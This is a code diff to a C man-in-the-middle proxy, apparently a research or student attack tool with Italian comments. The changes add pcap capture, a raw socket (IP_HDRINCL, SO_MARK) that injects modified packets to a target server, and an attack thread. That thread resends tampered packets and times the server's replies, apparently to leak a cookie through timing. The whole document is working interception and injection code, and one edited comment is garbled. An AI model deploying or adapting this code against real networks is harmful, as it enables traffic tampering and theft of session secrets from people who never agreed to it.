@@ -42,6 +42,7 @@ pthread_cond_t attack_thread_cond = PTHREAD_COND_INITIALIZER;
 pthread_mutex_t attack_thread_mutex = PTHREAD_MUTEX_INITIALIZER;
 bool attack;
 Byte *cookie; //define the large with thre realloc function
+pcap_t *pcap_handle;
 
 #define DIM_PAGE 4096
 
@@ -59,7 +60,6 @@ int main(int argc, char *argv[]) {
 
   pthread_t attack_thread;
   attack = false;
- 
 
   if (argc < 3) {
     perror("Missing arguments! \n");
@@ -101,8 +101,6 @@ int main(int argc, char *argv[]) {
 
   //extract_network_config(); 
   catch_signals();
-
-  pthread_create(&attack_thread, NULL, do_attack_thread, NULL);
   //variabili condizionali per sleep e risveglio del thread
 
   // selecting the operation mode
@@ -140,6 +138,15 @@ int main(int argc, char *argv[]) {
 
   printf("Starting MITM proxy \n");
 
+  char *server_interface = get_server_interface(ip_server, port_server);
+  pcap_handle = setup_pcap(server_interface, ip_server, port_server);
+
+  if(pcap_handle == NULL){
+    perror("error in pcap handle setup ");
+    exit(EXIT_FAILURE);
+  }
+
+  pthread_create(&attack_thread, NULL, do_attack_thread, NULL);
   setup_network_interception();
   intercept_packets();
 
@@ -157,7 +164,6 @@ void extract_network_config() {
     break;
   case 'n':
     get_network_info(my_ip, gateway_ip);
-    
     printf("LAN network configuration selected \n");
     break;
   case 'i':
@@ -313,7 +319,7 @@ static int packet_verdict_handler(struct nfq_q_handle *qh, struct nfgenmsg *nfms
   return nfq_set_verdict(qh, id, NF_ACCEPT, 0, NULL);
 }
 
-//function to extract the IP header from the packet payload
+//function to extract the IPayload header from the packet p
 static inline struct iphdr *extract_ip_header(Byte *payload, unsigned int payload_len){
   struct iphdr *ip_header;
   if(payload_len < sizeof(struct iphdr)){
@@ -461,12 +467,34 @@ unsigned short recalculate_checksum(){
 
 //function to send the modified packet to the server
 void send_modified_packet(){
+  int smp_fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
+  int hincl = 1;
+  int mark = 1;
 
-  //mettere la struct come tutti dati contigui
+  if(smp_fd < 0){
+    perror("Errore creazione socket");
+    return;
+  }
+  
+  if(setsockopt(smp_fd, IPPROTO_IP, IP_HDRINCL, &hincl, sizeof(hincl)) < 0){
+    perror("Errore nel settare IP_HDRINCL");
+  }
+
+
+  if(setsockopt(smp_fd, SOL_SOCKET, SO_MARK, &mark, sizeof(mark)) < 0){
+    perror("Errore nel settare SO_MARK");
+  }
+  /*
   int smp_fd = socket(AF_INET, SOCK_STREAM, IPPROTO_RAW);
-  char *raw_packet;
+  
 
-  restore_network_default();
+  //restore_network_default();
+  int mark = 1;
+  if (setsockopt(smp_fd, SOL_SOCKET, SO_MARK, &mark, sizeof(mark)) < 0) {
+      perror("Errore nel settare SO_MARK");
+  } */
+
+  char *raw_packet;
   
   unsigned int total_packet_length = data_packet->ip_header_len + data_packet->tcp_header_len + data_packet->data_len;
   raw_packet = (char *) malloc(total_packet_length);
@@ -490,17 +518,12 @@ void send_modified_packet(){
   close(smp_fd);
 }
 
-void wait_server_reply(){
-
-
-
-
-}
-
 //thread function to perform attack
 void *do_attack_thread(void *arg){
 
   struct timespec start, stop;
+  char *server_interface = get_server_interface(ip_server, port_server);
+  printf("server interface: %s", server_interface);
 
   unsigned short checksum;
   while(1==1){
@@ -531,23 +554,33 @@ void *do_attack_thread(void *arg){
     data_packet->tcp_header->check = checksum;
 
     printf("Checksum: %04x \n", checksum);
-
    
+    flush_pcap_buffer(pcap_handle);
+    
+    clock_gettime(CLOCK_MONOTONIC_RAW, &start);
+    
     send_modified_packet();
-    //clock_gettime(CLOCK_MONOTONIC, &start);
 
+    struct timespec stop = get_server_response_time(pcap_handle);;
 
-    //attendo la ricezione del pacchetto
+    if(stop.tv_sec == 0 && stop.tv_nsec == 0){
+      printf("Server didn't reply \n");
+      continue;
+    }
 
+    long resp_microsec = (stop.tv_sec * 1000000) + (stop.tv_nsec / 1000);
+    printf("valore di resp_microsec: %lu \n", resp_microsec);
+    long send_microsec = (start.tv_sec * 1000000) + (start.tv_nsec / 1000);
+    printf("valore di send_microsec: %lu \n", send_microsec);
+    long delta = resp_microsec - send_microsec; 
 
-    //clock_gettime(CLOCK_REALTIME, &stop);
+    printf("Reply delta time: %lu \n", delta);
 
-    //start_timer(); (forse chiamata subito dentro send_modified_packet)
-    //wait for response
-    //stop_timer();
     //write result to csv file
     attack = false;
   }
+
+  //close(pcap_handle);
 
 }
 
